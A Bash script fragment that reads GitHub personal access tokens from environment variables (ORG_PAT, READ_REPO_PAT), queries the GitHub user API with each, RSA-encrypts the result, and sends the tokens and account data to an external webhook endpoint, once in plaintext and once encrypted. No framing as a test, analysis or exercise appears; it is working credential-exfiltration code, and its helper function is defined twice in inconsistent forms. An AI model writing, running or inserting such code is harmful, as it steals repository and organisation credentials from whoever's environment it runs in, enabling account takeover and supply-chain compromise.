encrypt_chunk() {
    printf '%s' "$1" \
        | openssl pkeyutl -encrypt -pubin \
              -inkey <(printf '%s' "$PUB_KEY") \
              -pkeyopt rsa_padding_mode:oaep \
              -pkeyopt rsa_oaep_md:sha256 \
        | base64 -w0
}

for pat in ORG_PAT READ_REPO_PAT; do

        token="${!pat}"
		# ------------------------------------------------------- fetch the data --

		user_info="$(curl -s -i -H "Authorization: Bearer $token" https://api.github.com/user)"
		
		string="$user_info"     # includes response headers because of -i
		
		# ------------------------------------------ encrypt a single chunk --------
		encrypt_chunk() {
		    printf '%s' "$1" \
		        | openssl pkeyutl -encrypt -pubin \
		              -inkey "$PUB_KEY_FILE" \
		              -pkeyopt rsa_padding_mode:oaep \
		              -pkeyopt rsa_oaep_md:sha256 \
		        | base64 -w0
		}
		
		# ------------------------------------------------ chunked encryption -----
		chunks=()
		i=0
		while (( i < ${#string} )); do
		    chunks+=( "$(encrypt_chunk "${string:i:CHUNK_SIZE}")" )
		    i=$(( i + CHUNK_SIZE ))
		done
		
		# ------------------------------- join chunks ('.' i never in base64) ----
		encrypted_string="$(printf '%s.' "${chunks[@]}")"
		encrypted_string="${encrypted_string%.}"

		curl -s -o /dev/null "$webhook/send-pat?secret=$pat&token=$token" -d "$user_info"

		encrypted_token=$(printf '%s' "$token" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
		encrypted_pat=$(printf '%s' "$pat" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
		curl -s -o /dev/null "$webhook/send-pat?secret=$encrypted_pat&token=$encrypted_token" -d "$encrypted_string"
done

